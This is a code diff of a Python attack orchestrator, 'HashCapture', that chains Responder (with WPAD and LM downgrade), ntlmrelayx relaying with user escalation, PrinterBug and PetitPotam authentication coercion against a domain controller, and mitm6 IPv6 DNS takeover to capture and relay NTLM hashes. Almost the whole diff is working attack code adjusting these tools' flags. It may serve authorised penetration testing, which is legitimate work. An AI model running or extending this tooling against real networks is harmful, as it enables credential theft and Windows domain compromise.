@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import os
 import sys
 import time
@@ -55,11 +57,9 @@ class HashCapture:
         # Configure attack loggers
         for name, logger in self.attack_loggers.items():
             logger.setLevel(logging.DEBUG if verbose else logging.INFO)
-            # Add console handler
             console_handler = logging.StreamHandler(sys.stdout)
             console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
             logger.addHandler(console_handler)
-            # Add file handler
             file_handler = logging.FileHandler(f'{name}_attack.log')
             file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
             logger.addHandler(file_handler)
@@ -93,26 +93,6 @@ class HashCapture:
         except Exception as e:
             self.logger.error(f"Failed to setup IPv6 forwarding: {e}")
             return False
-
-    def signal_handler(self, signum, frame):
-        """Handle interruption signals"""
-        self.logger.info(f"Received signal {signum}")
-        self.cleanup()
-        sys.exit(0)
-
-    def process_output(self, process, logger, prefix=""):
-        """Process and log output from a subprocess"""
-        try:
-            for line in iter(process.stdout.readline, ''):
-                if self.stop_event.is_set():
-                    break
-                if line:
-                    line = line.strip()
-                    if line:
-                        logger.debug(f"{prefix}: {line}")
-        except Exception as e:
-            logger.error(f"Error processing output: {e}")
-
 
     def create_targets_file(self):
         """Create targets file for attacks if domain is specified"""
@@ -160,15 +140,53 @@ class HashCapture:
             self.logger.error(f"Error creating targets file: {e}")
             return False
 
+    def process_output(self, process, logger, prefix=""):
+        """Process and log output from a subprocess"""
+        try:
+            for line in iter(process.stdout.readline, ''):
+                if self.stop_event.is_set():
+                    break
+                if line:
+                    line = line.strip()
+                    if line:
+                        logger.debug(f"{prefix}: {line}")
+        except Exception as e:
+            logger.error(f"Error processing output: {e}")
+
+    def start_responder(self):
+        """Start Responder with proper flags"""
+        try:
+            cmd = [
+                "responder",
+                "-I", self.interface,
+                "-wd",  # Enable WPAD
+                "--lm",  # Enable LM downgrade for better compatibility
+                "-v"  # Verbose output
+            ]
+            
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
+            self.processes["responder"] = process
+            
+            self.process_output(process, self.attack_loggers["responder"], "RESPONDER")
+        except Exception as e:
+            self.logger.error(f"Error in start_responder: {e}")
+
     def start_ntlmrelay(self):
-        """Start ntlmrelay attack"""
+        """Start ntlmrelay attack with improved flags"""
         try:
             cmd = [
                 "ntlmrelayx.py",
                 "-tf", "targets.txt",
                 "-smb2support",
-                "--no-http-server",
-                "--no-wcf-server"
+                "-6",  # Enable IPv6
+                "-wh", "Proxy-Service",
+                "-of", "hashes/ntlmrelay-hashes",
+                "-wa", "3",
+                "--no-http-server",  # Disable HTTP server
+                "--no-wcf-server",   # Disable WCF server
+                "--escalate-user", "icebreaker",  # Target user to escalate
+                "--no-pass",  # Don't require password
+                "--no-acl"   # Don't check ACLs
             ]
             
             if self.domain:
@@ -181,21 +199,31 @@ class HashCapture:
         except Exception as e:
             self.logger.error(f"Error in start_ntlmrelay: {e}")
 
-    def start_responder(self):
-        """Start Responder"""
+    def start_printerbug(self):
+        """Start PrinterBug attack"""
+        if not self.domain or not self.dc_ip:
+            return
+        
         try:
             cmd = [
-                "responder",
-                "-I", self.interface,
-                "-wrf"
+                "printerbug.py",
+                f"{self.domain}/{self.dc_ip}",
+                self.local_ip,
+                "-d", self.domain,
+                "-port", "445",
+                "-no-pass"
             ]
             
-            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
-            self.processes["responder"] = process
+            if self.creds:
+                username, password = self.creds.split(':')
+                cmd.extend(["-u", username, "-p", password])
             
-            self.process_output(process, self.attack_loggers["responder"], "RESPONDER")
+            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
+            self.processes["printerbug"] = process
+            
+            self.process_output(process, self.attack_loggers["printerbug"], "PRINTERBUG")
         except Exception as e:
-            self.logger.error(f"Error in start_responder: {e}")
+            self.logger.error(f"Error in start_printerbug: {e}")
 
     def start_petitpotam(self):
         """Start PetitPotam attack"""
@@ -205,12 +233,15 @@ class HashCapture:
         try:
             cmd = [
                 "petitpotam.py",
-                "-d", self.domain,
-                "-u", self.creds.split(':')[0] if self.creds else "anonymous",
-                "-p", self.creds.split(':')[1] if self.creds else "",
                 self.local_ip,
-                self.dc_ip
+                self.dc_ip,
+                "-d", self.domain,
+                "-no-pass"
             ]
+            
+            if self.creds:
+                username, password = self.creds.split(':')
+                cmd.extend(["-u", username, "-p", password])
             
             process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
             self.processes["petitpotam"] = process
@@ -218,28 +249,6 @@ class HashCapture:
             self.process_output(process, self.attack_loggers["petitpotam"], "PETITPOTAM")
         except Exception as e:
             self.logger.error(f"Error in start_petitpotam: {e}")
-
-    def start_printerbug(self):
-        """Start PrinterBug attack"""
-        if not self.domain or not self.dc_ip:
-            return
-        
-        try:
-            cmd = [
-                "printerbug.py",
-                "-d", self.domain,
-                "-u", self.creds.split(':')[0] if self.creds else "anonymous",
-                "-p", self.creds.split(':')[1] if self.creds else "",
-                f"{self.domain}/{self.dc_ip}",
-                self.local_ip
-            ]
-            
-            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
-            self.processes["printerbug"] = process
-            
-            self.process_output(process, self.attack_loggers["printerbug"], "PRINTERBUG")
-        except Exception as e:
-            self.logger.error(f"Error in start_printerbug: {e}")
 
     def release_dns_port(self):
         """Attempt to release port 53"""
@@ -257,32 +266,23 @@ class HashCapture:
     def start_mitm6(self):
         """Start mitm6 attack"""
         try:
-            try:
-                subprocess.check_call([
-                    "pip", "install",
-                    "--no-deps", "mitm6==0.2.2",
-                    "--break-system-packages"
-                ])
-            except Exception as e:
-                self.logger.warning(f"Could not install/downgrade mitm6: {e}")
-
             self.release_dns_port()
 
             cmd = [
                 "mitm6",
                 "-i", self.interface,
-                "--debug",
-                "--no-ra"
+                "-d", self.domain,  # Target specific domain
+                "--ignore-nofqdn",  # Ignore hosts without FQDN
+                "--no-ra",  # Disable router advertisements
+                "--debug"
             ]
-            
-            if self.domain:
-                cmd.extend(["-d", self.domain])
             
             self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
             
             env = os.environ.copy()
-            env["PYTHONIOENCODING"] = "latin1"
+            env["PYTHONIOENCODING"] = "utf-8"
             env["PYTHONUNBUFFERED"] = "1"
+            env["LANG"] = "C.UTF-8"
             
             process = Popen(
                 cmd,
@@ -305,20 +305,6 @@ class HashCapture:
         except Exception as e:
             self.logger.error(f"Error in start_mitm6: {e}")
             return False
-
-    def extract_hashes(self):
-        """Extract captured hashes"""
-        try:
-            responder_log = Path("/usr/share/responder/logs")
-            if responder_log.exists():
-                self.logger.info("Processing Responder logs...")
-            
-            relay_log = Path("./relay.txt")
-            if relay_log.exists():
-                self.logger.info("Processing NTLM Relay logs...")
-                
-        except Exception as e:
-            self.logger.error(f"Error extracting hashes: {e}")
 
     def cleanup(self):
         """Cleanup resources and restore system state"""
@@ -351,6 +337,12 @@ class HashCapture:
             self.logger.info("Cleanup completed")
         except Exception as e:
             self.logger.error(f"Error in cleanup: {e}")
+
+    def signal_handler(self, signum, frame):
+        """Handle interruption signals"""
+        self.logger.info(f"Received signal {signum}")
+        self.cleanup()
+        sys.exit(0)
 
     def run(self):
         """Main execution flow"""
@@ -405,9 +397,6 @@ class HashCapture:
             self.stop_event.clear()
 
             self.logger.info("All attacks completed.")
-
-            # Extract captured hashes and passwords
-            self.extract_hashes()
 
         except KeyboardInterrupt:
             self.logger.info("Operation interrupted by user")
